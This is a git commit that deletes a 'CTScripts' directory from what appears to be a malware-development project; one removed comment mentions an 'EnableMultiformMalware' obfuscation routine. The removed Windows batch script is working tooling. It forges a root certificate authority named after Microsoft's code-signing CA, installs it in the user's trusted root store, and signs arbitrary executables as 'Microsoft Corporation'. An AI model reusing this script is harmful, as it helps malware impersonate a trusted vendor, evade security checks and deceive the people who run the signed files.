b36f00ccf70516cc5697b61cbae6f9038da1f698
Mahmoud Osman <60033959+Mahmoud7Osman@users.noreply.github.com>
2024-01-23 13:54:06 +0000

    Delete CTScripts directory

--- CTScripts/Linux/dyn_s2h.sh
+++
@@ -1,3 +0,0 @@
-# Compile-Time Script For Generating The header file used by the ObfuscationTools::EnableMultiformMalware() Class Member
-
-
--- CTScripts/Windows/cvsigner.bat
+++
@@ -1,6 +0,0 @@
-makecert.exe -r -pe -n "CN=Microsoft Code Signing PCA 2011" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MicrosoftCA.pvk MicrosoftCA.cer
-certutil.exe -user -addstore Root MicrosoftCA.cer
-makecert.exe -pe -n "CN=Microsoft Corporation" -a sha256 -cy end -sky signature -ic MicrosoftCA.cer -iv MicrosoftCA.pvk -sv MicrosoftCert.pvk MicrosoftCert.cer
-pvk2pfx.exe -pvk MicrosoftCert.pvk -spc MicrosoftCert.cer -pfx MicrosoftCert.pfx
-signtool.exe sign /fd SHA256 /v /f MicrosoftCert.pfx /t http://timestamp.digicert.com %1
-
